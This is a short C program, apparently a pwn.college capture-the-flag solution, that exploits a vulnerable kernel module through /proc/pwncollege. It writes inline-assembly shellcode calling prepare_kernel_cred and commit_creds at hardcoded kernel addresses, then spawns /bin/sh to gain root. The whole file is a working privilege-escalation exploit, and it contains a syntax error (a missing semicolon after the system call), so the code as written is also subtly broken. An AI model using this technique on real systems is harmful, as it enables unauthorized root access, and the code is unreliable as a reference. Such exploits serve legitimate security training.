#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>



// Simpler shellcode using inline assembly approach
void escalate_privs(void){
    __asm__(
        ".intel_syntax noprefix;"
        "movabs rax, 0xffffffff810881d0;" // prepare_kernel_cred
        "xor rdi, rdi;"
        "call rax;" 
        "mov rdi, rax;"
        "movabs rax, 0xffffffff81087e90;" // commit_creds
        "call rax;"
        "ret;"
    );
}

int main() {
    int fd;
   
    fd = open("/proc/pwncollege", O_WRONLY);

    unsigned char *shellcode_ptr = (unsigned char *)escalate_privs;
    
    write(fd, shellcode_ptr, 200);  // Write enough bytes to cover the function
    
    system("/bin/sh")
    close(fd);
    
    puts("[!] Should never be reached");
    return 0;
}
